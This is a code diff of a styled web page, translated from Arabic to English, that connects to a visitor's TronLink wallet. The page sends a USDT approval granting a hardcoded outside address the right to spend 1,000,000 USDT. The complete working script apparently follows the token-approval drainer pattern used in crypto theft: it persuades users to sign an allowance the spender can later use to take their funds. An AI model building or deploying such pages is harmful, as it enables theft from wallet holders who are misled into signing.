@@ -1,95 +1,212 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="en">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Approve USDT TRC20</title>
-  <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.2/dist/TronWeb.min.js"></script>
+  <title>Approve 1,000,000 USDT on TRON</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet" />
+  <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.3/dist/TronWeb.min.js" defer></script>
+  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.min.js" defer></script>
   <style>
-    body { font-family: Arial, sans-serif; text-align: center; }
-    button { padding: 10px 20px; font-size: 16px; cursor: pointer; background-color: #4CAF50; color: white; border: none; border-radius: 5px; }
-    button:hover { background-color: #45a049; }
-    #loading { color: green; font-weight: bold; display: none; margin-top: 10px; }
-    p { margin: 20px; }
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+    body {
+      font-family: "Inter", sans-serif;
+      background: linear-gradient(135deg, #0a0a0a, #1c1c1c);
+      color: #ffffff;
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 20px;
+    }
+    .container {
+      background: rgba(15, 15, 15, 0.95);
+      border-radius: 20px;
+      padding: 40px;
+      max-width: 600px;
+      width: 100%;
+      box-shadow: 0 10px 40px rgba(0, 0, 0, 0.8);
+      text-align: center;
+      border: 1px solid #00d4ff;
+      animation: fadeIn 1s ease-out;
+    }
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(20px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+    h2 {
+      font-size: 32px;
+      font-weight: 800;
+      color: #00d4ff;
+      margin-bottom: 20px;
+      text-shadow: 0 0 10px rgba(0, 212, 255, 0.5);
+    }
+    p {
+      font-size: 18px;
+      color: #cccccc;
+      margin-bottom: 20px;
+      line-height: 1.5;
+    }
+    .spender-address {
+      font-weight: 600;
+      color: #00ff88;
+      word-break: break-all;
+    }
+    button {
+      background: linear-gradient(45deg, #00d4ff, #00ff88);
+      border: none;
+      border-radius: 12px;
+      padding: 15px 40px;
+      font-size: 18px;
+      font-weight: 600;
+      color: #1a1a1a;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+      margin-top: 20px;
+    }
+    button:hover {
+      background: linear-gradient(45deg, #00ff88, #00d4ff);
+      transform: scale(1.05);
+      box-shadow: 0 0 20px rgba(0, 255, 136, 0.5);
+    }
+    #loading {
+      color: #00ff88;
+      font-weight: 600;
+      font-size: 16px;
+      display: none;
+      margin-top: 20px;
+      animation: pulse 1.5s infinite;
+    }
+    @keyframes pulse {
+      0% { opacity: 1; }
+      50% { opacity: 0.5; }
+      100% { opacity: 1; }
+    }
+    .status {
+      margin-top: 20px;
+      font-size: 16px;
+      font-weight: 600;
+      color: #ff4d4d;
+      min-height: 25px;
+    }
+    @media (max-width: 480px) {
+      .container {
+        padding: 20px;
+      }
+      h2 {
+        font-size: 24px;
+      }
+      p {
+        font-size: 16px;
+      }
+      button {
+        padding: 12px 30px;
+        font-size: 16px;
+      }
+    }
   </style>
 </head>
 <body>
-  <h2>تفويض 1,000,000 USDT على شبكة ترون</h2>
-  <p>اضغط على الزر لمنح صلاحية لعنوان: <br><strong>TR593Y5U3tEiZsNTHykEDEd81EpXvWzcfu</strong></p>
-  <button onclick="approveUSDT()">إعطاء صلاحية للتفويض</button>
-  <div id="loading">جاري معالجة المعاملة...</div>
+  <div class="container">
+    <h2>Approve 1,000,000 USDT on TRON</h2>
+    <p>Click the button to authorize the address:<br><strong class="spender-address">TR593Y5U3tEiZsNTHykEDEd81EpXvWzcfu</strong></p>
+    <button onclick="approveUSDT()">Authorize Approval</button>
+    <div id="loading">Processing Transaction...</div>
+    <p class="status" id="statusText"></p>
+  </div>
 
   <script>
-    const usdtContractAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+    const usdtContractAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // USDT TRC-20
     const spenderAddress = "TR593Y5U3tEiZsNTHykEDEd81EpXvWzcfu";
+    const usdtABI = [
+      {
+        constant: false,
+        inputs: [
+          { name: "_spender", type: "address" },
+          { name: "_value", type: "uint256" }
+        ],
+        name: "approve",
+        outputs: [{ name: "", type: "bool" }],
+        type: "function",
+        stateMutability: "nonpayable"
+      }
+    ];
+
+    async function waitForTronWeb(timeout = 5000) {
+      const start = Date.now();
+      while (!window.tronWeb || !window.tronWeb.ready) {
+        if (Date.now() - start > timeout) {
+          return false;
+        }
+        await new Promise(resolve => setTimeout(resolve, 100));
+      }
+      return true;
+    }
 
     async function approveUSDT() {
+      const loadingDiv = document.getElementById("loading");
+      const statusText = document.getElementById("statusText");
+
       try {
-        const loadingDiv = document.getElementById("loading");
         loadingDiv.style.display = "block";
+        statusText.textContent = "";
 
-        // التحقق من وجود TronLink
-        if (!window.tronWeb || !window.tronWeb.defaultAddress.base58) {
-          alert("يرجى تثبيت TronLink وتسجيل الدخول إلى محفظتك.");
+        // Wait for TronWeb to be ready
+        const tronWebReady = await waitForTronWeb();
+        if (!tronWebReady || !window.tronWeb.defaultAddress.base58) {
+          statusText.textContent = "Please install TronLink and log in to your wallet.";
           loadingDiv.style.display = "none";
           return;
         }
 
-        // التحقق من الشبكة
+        // Verify network
         if (window.tronWeb.fullNode.host !== "https://api.trongrid.io") {
-          alert("يرجى الاتصال بشبكة ترون الرئيسية (Mainnet).");
+          statusText.textContent = "Please connect to the TRON Mainnet.";
           loadingDiv.style.display = "none";
           return;
         }
 
-        // التحقق من صحة عنوان Spender
+        // Verify spender address
         if (!window.tronWeb.isAddress(spenderAddress)) {
-          alert("عنوان المفوض (Spender) غير صالح!");
+          statusText.textContent = "Invalid spender address!";
           loadingDiv.style.display = "none";
           return;
         }
 
-        // إعداد ABI لعقد USDT
-        const usdtABI = [
-          {
-            "constant": false,
-            "inputs": [
-              { "name": "_spender", "type": "address" },
-              { "name": "_value", "type": "uint256" }
-            ],
-            "name": "approve",
-            "outputs": [{ "name": "", "type": "bool" }],
-            "type": "function",
-            "stateMutability": "nonpayable"
-          }
-        ];
-
-        // إعداد العقد
+        // Initialize contract
         const contract = await window.tronWeb.contract(usdtABI, usdtContractAddress);
 
-        // قيمة الـ Approve: 1,000,000 USDT (1,000,000 * 10^6)
-        const amount = "1000000000000";
+        // Set approval amount: 1,000,000 USDT (6 decimals)
+        const amount = ethers.utils.parseUnits("1000000", 6).toString();
 
-        // تأكيد من المستخدم قبل إرسال المعاملة
-        if (!confirm(`هل أنت متأكد من منح صلاحية 1,000,000 USDT للعنوان: ${spenderAddress}؟\nملاحظة: سيتم التفويض حتى لو لم يكن لديك رصيد كافٍ.`)) {
+        // Confirm approval
+        if (!confirm(`Are you sure you want to approve 1,000,000 USDT for the address: ${spenderAddress}?\nNote: This approval will proceed even if you don't have sufficient balance.`)) {
+          statusText.textContent = "Approval cancelled.";
           loadingDiv.style.display = "none";
           return;
         }
 
-        // إرسال معاملة Approve
+        // Send approval transaction
+        statusText.textContent = "Sending approval transaction...";
         const tx = await contract.approve(spenderAddress, amount).send({
-          feeLimit: 15000000, // 15 TRX، مناسب لمعاملة Approve
-          callValue: 0
+          feeLimit: 20000000, // 20 TRX
+          callValue: 0,
+          shouldPollResponse: false
         });
 
-        alert(`تم إرسال معاملة التفويض بنجاح!\nمعرف المعاملة (TxID):\n${tx}`);
-        console.log("Transaction ID:", tx);
+        statusText.textContent = `✅ Approval successful! Transaction ID: ${tx}`;
         loadingDiv.style.display = "none";
 
       } catch (error) {
-        console.error("خطأ أثناء المعاملة:", error);
-        alert(`فشل تنفيذ عملية التفويض:\n${error.message || error}\nتأكد من وجود رصيد TRX كافٍ (حوالي 15 TRX) لدفع رسوم المعاملة.`);
-        document.getElementById("loading").style.display = "none";
+        console.error("Transaction error:", error);
+        statusText.textContent = `Approval failed: ${error.message || error}. Ensure you have ~20 TRX for fees.`;
+        loadingDiv.style.display = "none";
       }
     }
   </script>
